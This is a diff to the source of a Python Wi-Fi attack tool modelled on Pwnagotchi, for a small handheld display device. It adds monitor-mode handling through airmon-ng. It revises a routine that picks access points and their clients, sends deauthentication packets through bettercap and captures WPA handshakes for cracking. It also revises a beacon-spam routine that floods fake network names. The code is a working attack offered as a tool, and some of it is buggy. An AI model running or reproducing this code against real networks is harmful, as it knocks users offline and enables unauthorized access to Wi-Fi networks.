@@ -77,6 +77,67 @@ class PwnagotchiScreen():
 
             sleep(0.25) # minimize writes
 
+class airmon:
+    def toggleMonitorMode(iface):
+        try:
+            a = getoutput("sudo /usr/sbin/airmon-ng start {} | grep \"mac80211 monitor mode\"".format(iface)).strip().split("[phy")[-1]
+            rmStr = ''.join(a[:2])
+            monIface = a.replace(")", "").replace(rmStr, "") # ooga booga i hate regex so im gonna use the .strip() and .split() and .replace() !!!!!!!!!
+
+            return {
+                "interface": monIface,
+                "monitorMode": True
+            }
+        
+        except:
+            a = getoutput("sudo /usr/sbin/airmon-ng stop {} | grep \"mac80211 station mode\"".format(iface)).strip().split("[phy")[-1]
+            rmStr = ''.join(a[:2])
+            monIface = a.replace(")", "").replace(rmStr, "") # ooga booga i hate regex so im gonna use the .strip() and .split() and .replace() !!!!!!!!!
+
+            return {
+                "interface": monIface,
+                "monitorMode": False
+            }
+        
+    def startMonitorMode(iface):
+        try:
+            a = getoutput("sudo /usr/sbin/airmon-ng start {} | grep \"mac80211 monitor mode\"".format(iface)).strip().split("[phy")[-1]
+            rmStr = ''.join(a[:2])
+            monIface = a.replace(")", "").replace(rmStr, "") # ooga booga i hate regex so im gonna use the .strip() and .split() and .replace() !!!!!!!!!
+
+            return {
+                "interface": monIface,
+                "monitorMode": True
+            }
+        
+        except:
+            a = getoutput("sudo /usr/sbin/airmon-ng stop {} | grep \"mac80211 monitor mode\"".format(iface)).strip().split("[phy")[-1]
+            rmStr = ''.join(a[:2])
+            monIface = a.replace(")", "").replace(rmStr, "") # ooga booga i hate regex so im gonna use the .strip() and .split() and .replace() !!!!!!!!!
+
+            return {
+                "interface": monIface, # not changed
+                "monitorMode": None
+            }
+        
+    def stopMonitorMode(iface):
+        try:
+            a = getoutput("sudo /usr/sbin/airmon-ng stop {} | grep \"mac80211 monitor mode\"".format(iface)).strip().split("[phy")[-1]
+            rmStr = ''.join(a[:2])
+            monIface = a.replace(")", "").replace(rmStr, "") # ooga booga i hate regex so im gonna use the .strip() and .split() and .replace() !!!!!!!!!
+
+            return {
+                "interface": monIface,
+                "monitorMode": False
+            }
+        
+        except:
+            a = getoutput("sudo /usr/sbin/airmon-ng stop {} | grep \"stop a device that isn't in monitor mode\"".format(iface))
+            if "stop a device that isn't in monitor mode" in a: # no shit its gonna be there
+                return {
+                    "interface": monIface, # not changed
+                    "monitorMode": None
+                }
 
 def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTries:int=10, checkDelay:float=float(1), nextDelay:float=float(10), fileLocation="/home/pwnagotchi/handshakes", debug:bool=False, prettyDebug:bool=True):
 
@@ -93,17 +154,20 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
 
     whitelist = []
 
-    if prettyDebug: uStatus("whitelist: {}".format(', '.join(whitelist)))
+    if prettyDebug: print("whitelist: {}".format(', '.join(whitelist)))
+    interface = airmon.startMonitorMode(loads(open("./config.json").read())["normalInterface"])["interface"]
 
-    cli = bcap.Client()
+    print("interface: {}".format(interface))
 
-    if not cli.successful: return
+    cli = bcap.Client(iface=interface)
+
+    if not cli.successful: screen.exited = True; sleep(0.5); return
 
     cli.recon()
     cli.clearWifi()
 
     while True:
-        if screen.exited: cli.run("exit"); return
+        if screen.exited: cli.run("exit"); airmon.stopMonitorMode(interface); return
         json = cli.getPairs()
 
         screen.aps = len(json)
@@ -120,6 +184,7 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
         for ap in json:
             screen.clients += len(json[ap][2]['clients'])
 
+        # get clients
         for ap in json.copy():
             fullBreak = False
             pulledHandshake = False
@@ -130,20 +195,21 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
             if debug: print("checking ap")
 
             if screen.exited:
-                if debug: print("returned"); return
+                if debug: print("returned"); cli.stop(); airmon.stopMonitorMode(interface); return
 
             if ap.lower() in whitelist:
                 if debug: print("whitelist")
-                if prettyDebug: uError("skipped {} due to whitelist".format(ap.lower()))
+                if prettyDebug: print("skipped {} due to whitelist".format(ap.lower()))
                 continue
 
             if len(json[ap][2]['clients']) == 0:
                 if debug: print("{} doesn't have clients".format(ssid))
-                if prettyDebug: uError("{} doesnt have clients (clients len: {} | clients: {})".format(ssid, len(json[ap][2]["clients"]), ', '.join(json[ap][2]["clients"])))
+                if prettyDebug: print("{} doesnt have clients (clients len: {} | clients: {})".format(ssid, len(json[ap][2]["clients"]), ', '.join(json[ap][2]["clients"])))
                 continue # empty
 
             while True:
-                if screen.exited: cli.run("exit"); return
+                # choose clients
+                if screen.exited: cli.run("exit"); airmon.stopMonitorMode(interface); return
                 targetClient = choice(json[ap][2]["clients"]) # to deauth
                 pickNew = False
 
@@ -151,65 +217,59 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
 
                 if targetClient[0].lower() in whitelist:
                     if debug: print("new ap due to whitelist")
-                    if prettyDebug: uError("skipped {} due to whitelist (2)".format(ap.lower()))
+                    if prettyDebug: print("skipped {} due to whitelist (2)".format(ap.lower()))
                     fullBreak = True; break # pick new ap
 
                 if ap in deauthed:
                     if debug: print("{} already deauthed; new ap".format(ssid))
-                    if prettyDebug: uError("skipped {} ({}); already deauthed".format(ap.lower(), ssid))
+                    if prettyDebug: print("skipped {} ({}); already deauthed".format(ap.lower(), ssid))
                     json.pop(ap)
                     fullBreak = True; break # pick new ap
 
-                """
-                for i in deauthed[ap]:
-                    if screen.exited: cli.run("exit"); return
-                    if targetClient == i:
-                        #pickNew = True; break # pick new choice
-                        break # dont have to pick new one
-                    else:
-                        break
-                """
-
                 if debug: print("chose client")
-                if prettyDebug: uSuccess("chose {} ({}) (AP) to deauth".format(ap.lower(), ssid))
+                if prettyDebug: print("chose {} ({}) (AP) to deauth".format(ap.lower(), ssid))
                         
                 if pickNew: continue
 
-                break
+                break # break when found a client
 
             if fullBreak: fullBreak = False; continue # if we need to pick new ap
 
+            # associate
             screen.console = "asoc. w {}".format(ap)
-            if prettyDebug: uStatus("associating with {} ({})".format(ap, ssid))
+            if prettyDebug: print("associating with {} ({})".format(ap, ssid))
             screen.face = screen.faces["assoc"]
             cli.associate(ap, throttle=5) # throttle 2.5 seconds to wait for assoc
 
             if debug: print(targetClient)
 
+            # start deauthing
             screen.face = screen.faces["attacking"]
             screen.console = "deauthing {}".format(ap)
-            if prettyDebug: uStatus("deauthing {} ({})".format(ap, ssid))
+            if prettyDebug: print("deauthing {} ({})".format(ap, ssid))
             for _x in range(deauthMaxTries):
+                # send deauth
                 if pulledHandshake: break
-                if screen.exited: cli.run("exit"); return
+                if screen.exited: cli.run("exit"); airmon.stopMonitorMode(interface); return
 
                 for _z in range(deauthBurst):
-                    if screen.exited: cli.run("exit"); return
+                    if screen.exited: cli.run("exit"); airmon.stopMonitorMode(interface); return
 
-                    if prettyDebug: uStatus("sent deauth packets (us -> {}".format(ap))
+                    if prettyDebug: print("sent deauth packets (us -> {}".format(ap))
                     cli.deauth(ap, throttle=0)
 
-                    if prettyDebug: uStatus("sent deauth packets (us -> {}".format(targetClient[0]))
+                    if prettyDebug: print("sent deauth packets (us -> {}".format(targetClient[0]))
                     cli.deauth(targetClient[0], throttle=0)
                     # or
                     #cli.scapyDeauth(ap, targetClient[0])
 
                 sleep(2.5) # camp their handshake for 2 n a half seconds, as thats the average time a device needs to disconnect and reconnect; bettercap will be sniffing during this 10s
 
+                # check for recieved handshake
                 for _y in range(checkHandshakeTries):
                     if screen.exited: cli.run("exit"); return
                     if cli.hasHandshake(ap) or cli.hasHandshake(targetClient[0]):
-                        if prettyDebug: uSuccess("got {}'s handshake ({})".format(ap, ssid))
+                        if prettyDebug: print("got {}'s handshake ({})".format(ap, ssid))
                         screen.console = "got {}'s HS".format(ssid)
                         screen.face = screen.faces["excited"]
                         screen.handshakes += 1
@@ -232,7 +292,8 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
 
                         break
                     else:
-                        if prettyDebug: uError("missed {}'s handshake ({})".format(ap, ssid))
+                        # if not, try again
+                        if prettyDebug: print("missed {}'s handshake ({})".format(ap, ssid))
                         screen.console = "missed {} handshake ({})".format(ssid, _y)
                         screen.face = screen.faces["lost"]
 
@@ -240,63 +301,14 @@ def pwnagotchi(args, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTrie
 
             if debug: print(ssid)
 
-            if not pulledHandshake:
-                if prettyDebug: uError("completely missed {}'s handshakes ({})".format(ap, ssid))
+            if not pulledHandshake: # if missed, say you missed like a dumbass
+                if prettyDebug: print("completely missed {}'s handshakes ({})".format(ap, ssid))
                 screen.console = "missed"
                 screen.face = screen.faces["missed"]
             
             pulledHandshake = False
 
             sleep(nextDelay)
-
-def isManaged(iface):
-    a = loads(getoutput("ip -j a show {}".format(iface)))
-
-    if "BROADCAST" in a[0]["flags"]:
-        return True # managed
-    elif "radiotap" in a[0]["flags"]:
-        return False # mon
-
-def monitorMode(args:list):
-    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]
-
-    print("monitor mode shit")
-
-    ifaces = nf.interfaces()
-    priority = loads(open("./config.json", "r").read())
-
-    fullClear(draw)
-
-    if priority["monitorInterface"] in ifaces:
-        print("mon")
-
-        getoutput("sudo airmon-ng stop {}".format(priority["monitorInterface"]))
-        getoutput("sudo systemctl restart NetworkManager")
-        getoutput("sudo ifconfig {} up".format(priority["normalInterface"]))
-        draw.text([8,8], "stopped interface", fill=0, outline=255, font=None)
-
-    elif priority["normalInterface"] in ifaces:
-        print("normal")
-
-        getoutput("sudo airmon-ng check kill")
-        getoutput("sudo airmon-ng start {}".format(priority["normalInterface"]))
-
-        draw.text([8,8], "started interface", fill=0, outline=255, font=None)
-    else:
-        print("none")
-        
-        for x in ifaces:
-            getoutput("sudo airmon-ng stop {}".format(x))
-            getoutput("sudo ifconfig {} up".format(x))
-
-        getoutput("sudo systemctl restart NetworkManager")
-
-        draw.text([8,8], "stopped all ifaces", fill=0, outline=255, font=None)
-
-    screenShow(disp, image, flipped=False, stream=True)
-
-    waitForKey(GPIO)
-    while checkIfKey(GPIO): pass
 
 def setInterfaces(args:list):
     draw, disp, image, GPIO= args[0], args[1], args[2], args[3]
@@ -309,21 +321,6 @@ def setInterfaces(args:list):
         b = loads(open("./config.json", "r").read())
 
         b["normalInterface"] = a
-
-        #fullClear(draw)
-        #draw.text([4,4], "select monitor mode interface", font=ImageFont.truetype('core/fonts/tahoma.ttf', 8))
-        #disp.ShowImage(disp.getbuffer(image))
-        #waitForKey(GPIO, debounce=True)
-
-        getoutput("sudo airmon-ng start {}".format(a))
-
-        ifaces2 = nf.interfaces()
-
-        c = menu(draw, disp, image, ifaces2, GPIO, caption="select monmode iface")
-
-        b["monitorInterface"] = c
-
-        getoutput("sudo airmon-ng stop {}".format(a))
 
         with open("./config.json", "w") as f:
             f.write(dumps(b, indent=4))
@@ -357,7 +354,9 @@ def beaconSpam(args:list):
         ssidFrames = []
         threads1 = []
 
-        iface = loads(open("./config.json").read())["monitorInterface"]
+        normalIfaec = loads(open("./config.json").read())["normalInterface"]
+
+        iface = airmon.startMonitorMode(normalIfaec)["interface"]
 
         handler.text = "iface: {}".format(iface)
 
@@ -399,6 +398,7 @@ def beaconSpam(args:list):
             sendp(ssidFrames, iface=iface, verbose=1, count=25)
 
             handler.text = "frames: {}\niface: {}\nhold any key to stop".format(vars.framesSent,iface)
+
     except Exception as e:
         handler.text = str(e)
 
@@ -410,6 +410,8 @@ def beaconSpam(args:list):
         x.join()
 
     handler.exit()
+    
+    airmon.stopMonitorMode(iface)
 
     sleep(0.5)
 
@@ -431,12 +433,15 @@ def rssiReader(args:list):
 
     #handler.update()
 
-    iface = loads(open("./config.json").read())["monitorInterface"]
+    iface = airmon.startMonitorMode(loads(open("./config.json").read())["normalInterface"])["interface"]
+
+    sleep(1) # wait for iface to go up
+
     font = ImageFont.truetype('core/fonts/roboto.ttf', 10)
 
     try:
         cli = bcap.Client(iface=iface)
-        if not cli.successful: raise Exception("b")
+        if not cli.successful: raise Exception("b") # why the fuck did i do this
     except Exception as e:
         draw.text([2,2], "failed to init bettercap:\n{}\n\nwaiting on your key...".format(str(e)))
         disp.ShowImage(disp.getbuffer(image))
@@ -490,7 +495,10 @@ def rssiReader(args:list):
 
         draw.rectangle([(0, 0), (200, 14)], fill=0, outline=255)
 
-        draw.text((3, 1), ''.join([str(x) for x in abVars.json[abVars.stri[ch]][0][:16]]), fill=1, outline=255, font=None)
+        try:
+            draw.text((3, 1), ''.join([str(x) for x in abVars.json[abVars.stri[ch]][0][:16]]), fill=1, outline=255, font=None)
+        except:
+            draw.text((3, 1), "n/a", fill=1, outline=255, font=None)
         draw.text((100, 1), "{}/{}".format(abVars.stri.index(abVars.stri[ch]), len(abVars.stri) - 1), fill=1, outline=255, font=font)
 
         compiledJson = []
@@ -537,6 +545,7 @@ def rssiReader(args:list):
             elif key == gpioPins["KEY3_PIN"]:
                 #print(cli.run("exit"))
                 cli.stop()
+                airmon.stopMonitorMode(normIface)
                 return
 
 
@@ -550,7 +559,6 @@ def functions():
             "pwnagotchi": "dfhuigosaio9by tdfhudfhudfhudfhudfhurdfhuedfhusdfhuodfhudfhudfhudfhudfhudfhudfhudfhudfhudfhudofhudfhuodfhuodofhudfhu",
             "beaconSpam": "spam beacons",
             "rssiReader": "read rssi beacons",
-            "monitorMode": "toggle monitor mode",
             "setInterfaces": "set normal and monitor mode interfaces"
         },
         
